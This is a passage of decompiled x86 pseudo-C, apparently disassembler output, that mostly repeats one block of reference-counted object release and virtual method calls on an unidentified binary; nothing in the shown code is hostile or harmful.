0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                iStack1436 = (**(*piVar6 + 0xc))();\n                iStack1436 = iStack1436 + 0x10;\n                iStack1468 = 0x52e800;\n                uStack1464 = 0x4085d2;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1464 = 0x52e800;\n                    ppiStack1472 = 0x4085e5;\n                    iStack1468 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1472 = iStack1448 + -0x10;\n                piVar6 = iStack1448 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1476 = 0x40860b;\n                    (**(**ppiStack1472 + 4))();\n                }\n                ppiStack1472 = 0x408617;\n                fcn.0040f620();\n                iStack1480 = 0x52e800;\n                iStack1476 = 0x40862c;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1476 = 0x52e800;\n                    ppiStack1484 = 0x408642;\n                    iStack1480 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1484 = in_stack_00000024 + -0x10;\n                piVar6 = in_stack_00000024 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1488 = 0x40866b;\n                    (**(**ppiStack1484 + 4))();\n                }\n                ppiStack1484 = 0x408677;\n                fcn.0040f620();\n                iStack1492 = 0x52e800;\n                iStack1488 = 0x40868c;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1488 = 0x52e800;\n                    ppiStack1496 = 0x4086a2;\n                    iStack1492 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1496 = iStack332 + -0x10;\n                piVar6 = iStack332 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1500 = 0x4086cb;\n                    (**(**ppiStack1496 + 4))();\n                }\n                ppiStack1496 = 0x4086d4;\n                fcn.0040f620();\n                iStack1504 = 0x52e800;\n                iStack1500 = 0x4086e9;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1500 = 0x52e800;\n                    ppiStack1508 = 0x4086fc;\n                    iStack1504 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1508 = iStack1456 + -0x10;\n                piVar6 = iStack1456 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                